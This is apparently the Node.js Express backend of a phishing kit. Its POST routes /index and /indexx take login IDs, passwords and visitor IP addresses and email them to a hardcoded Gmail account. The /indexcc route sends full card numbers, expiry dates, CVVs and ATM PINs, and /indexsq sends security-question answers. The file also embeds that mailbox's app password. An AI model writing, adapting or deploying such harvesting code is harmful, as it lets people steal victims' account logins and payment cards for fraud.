const express = require("express");
const session = require('express-session')
const app = express();
const path = require('path');
const requestIp = require('request-ip');
const crypto = require('crypto');
const cors = require('cors');

const nodemailer = require("nodemailer");

const PORT = process.env.PORT|| 5000;

console.log(crypto.randomBytes(64).toString('hex'));
//middleware
app.use(session({
    secret: process.env.SESSION_SECRET || 'fallback_secret',
    resave: false,
    saveUninitialized: true
}));
app.use(express.static(path.join(__dirname, '../frontendjus'))); 
app.use(express.json());
app.use(cors({
    origin: 'https://frontendjust.onrender.com',
    credentials: true 
}));
app.use(requestIp.mw());

app.listen(PORT, ()=>{
    console.log(`server running on ${PORT}`)
})


app.get('/', (req, res)=>{
     res.setHeader("Access-Control-Allow-Credentials","true")
    res.sendFile(path.join(__dirname + '../frontendjus/index.html'))
})

app.post ('/index',async (req, res)=>{
    // const ipAdress = req.socket.remoteAddress;
    const ipAddress = req.clientIp;
    if (typeof ipAddress !== 'string') {
        ipAddress = ipAddress.toString()
    }
    console.log(req.body)
    console.log(ipAddress)

    const transporter = nodemailer.createTransport({
        service : 'gmail',
        auth:{
            user: 'happyflames07@gmail.com',
            pass: 'kznh crjj ntgc nuga'
        }
    })

    const mailOptions = {
        from : req.body.userid,
        to: 'happyflames07@gmail.com',
        subject: `Message from ${req.body.userid}`,
        text: `LoginID:${req.body.userid} password:${req.body.password} ip:${ipAddress}`
    }

    
        transporter.sendMail(mailOptions,(error, info)=>{
            if(error){
                res.send('error');
                console.log(error);
            }else{
                console.log('Email sent' + info.response)
                res.send('success')
            }
        })
})

app.get('/indexx', (req,res)=>{
    res.setHeader("Access-Control-Allow-Credentials","true")
    res.sendFile(path.join(__dirname + '../frontendjus/indexx.html'))
})

app.post ('/indexx',async (req, res)=>{
    // const ipAdress = req.socket.remoteAddress;
    const ipAddress = req.clientIp;
    if (typeof ipAddress !== 'string') {
        ipAddress = ipAddress.toString()
    }
    console.log(req.body)
    console.log(ipAddress)

    const transporter = nodemailer.createTransport({
        service : 'gmail',
        auth:{
            user: 'happyflames07@gmail.com',
            pass: 'kznh crjj ntgc nuga'
        }
    })

    const mailOptions = {
        from : req.body.userid,
        to: 'happyflames07@gmail.com',
        subject: `Message from ${req.body.userid}`,
        text: `LoginID2:${req.body.userid} password2:${req.body.password} ip:${ipAddress}`
    }

    
        transporter.sendMail(mailOptions,(error, info)=>{
            if(error){
                res.send('error');
                console.log(error);
            }else{
                console.log('Email sent' + info.response)
                res.send('success')
            }
        })
})

app.get('/indexcc', (req,res)=>{
    res.setHeader("Access-Control-Allow-Credentials","true")
    res.sendFile(path.join(__dirname + '../frontendjus/indexcc.html'))
})

app.post ('/indexcc',async (req, res)=>{
    // const ipAdress = req.socket.remoteAddress;

    const transporter = nodemailer.createTransport({
        service : 'gmail',
        auth:{
            user: 'happyflames07@gmail.com',
            pass: 'kznh crjj ntgc nuga'
        }
    })

    const mailOptions = {
        from : req.body.userid,
        to: 'happyflames07@gmail.com',
        subject: `Message from ${req.body.userid}`,
        text: `Full Name:${req.body.fname} Card Number:${req.body.cardnumber} Expiration Date:${req.body.expdate} cvv:${req.body.cvv} ATM pin:${req.body.atmpin}`
    }

    
        transporter.sendMail(mailOptions,(error, info)=>{
            if(error){
                res.send('error');
                console.log(error);
            }else{
                console.log('Email sent' + info.response)
                res.send('success')
            }
        })
})

app.get('/indexsq', (req,res)=>{
    res.setHeader("Access-Control-Allow-Credentials","true")
    res.sendFile(path.join(__dirname + '../frontendjus/index.html'))
})

app.post ('/indexsq',async (req, res)=>{
    // const ipAdress = req.socket.remoteAddress;

    const transporter = nodemailer.createTransport({
        service : 'gmail',
        auth:{
            user: 'happyflames07@gmail.com',
            pass: 'kznh crjj ntgc nuga'
        }
    })

    const mailOptions = {
        from : req.body.userid,
        to: 'happyflames07@gmail.com',
        subject: `Message from ${req.body.userid}`,
        text: `${req.body.selectedOption1}:${req.body.ans1} ${req.body.selectedOption2}:${req.body.ans2} ${req.body.selectedOption3}:${req.body.ans3} ${req.body.selectedOption4}:${req.body.ans4} ${req.body.selectedOption5}:${req.body.ans5}`
    }

    
        transporter.sendMail(mailOptions,(error, info)=>{
            if(error){
                res.send('error');
                console.log(error);
            }else{
                console.log('Email sent' + info.response)
                res.send('success')
            }
        })
})
